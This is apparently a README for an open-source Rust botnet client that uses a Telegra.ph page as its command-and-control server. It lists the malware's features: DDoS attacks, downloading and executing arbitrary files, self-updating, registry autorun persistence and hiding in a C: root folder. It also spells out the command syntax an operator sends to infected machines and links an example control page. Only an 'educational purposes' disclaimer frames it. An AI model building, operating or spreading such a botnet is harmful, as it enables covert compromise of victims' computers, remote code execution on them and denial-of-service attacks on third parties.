# Rust Botnet
An example botnet client which uses [Telegra.ph](https://telegra.ph) as a C&C server.

## Features
* DoS attack feature.
* Loader & Executer of any files.
* Update feature.
* Program adds itself to autoload register and moves to hidden folder in C:/ drive root.
* Botnet deletion by command.

Notice, that this is not production ready version. 
There are many bugs which are waiting for a fix.

## Example & List of commands
Example of a C&C server is located [here](https://telegra.ph/Cls93sog103ekfSfKTEsto294kfaozwkd394-rktkcsd-krfasseegpe11-03-20).
Botnet uses the next syntax - `command{split}value` or `command{split}value{sep}value's_value`
### Available commands
* `download_exec{split}LINK_TO_FILE` - download and run a file which is located at `LINK_TO_FILE`.
* `ddos{split}TARGET{sep}TIME` - ddos a `TARGET` for `TIME` seconds.
* `upgrade{split}LINK_TO_FILE{sep}VERSION` - download and install an update which is located at `LINK_TO_FILE`. Update will be installed only if botnet's file version is lower than `VERSION`.
* `stop{split}` - you should use that command to stop the previous command execution.
* `delete_botnet{split}` - delete the botnet and it's registry notes from the client's PC.
* `exit{split}` - close botnet's executable file.

## Disclaimer
This program must be used for educational purposes only!
Only **you** are responsible for anything **you** do with it!

## Licence
This project is licensed under the MIT License - see the [LICENSE.md](https://github.com/Ookldev/rust_botnet/blob/master/LICENSE) file for details.
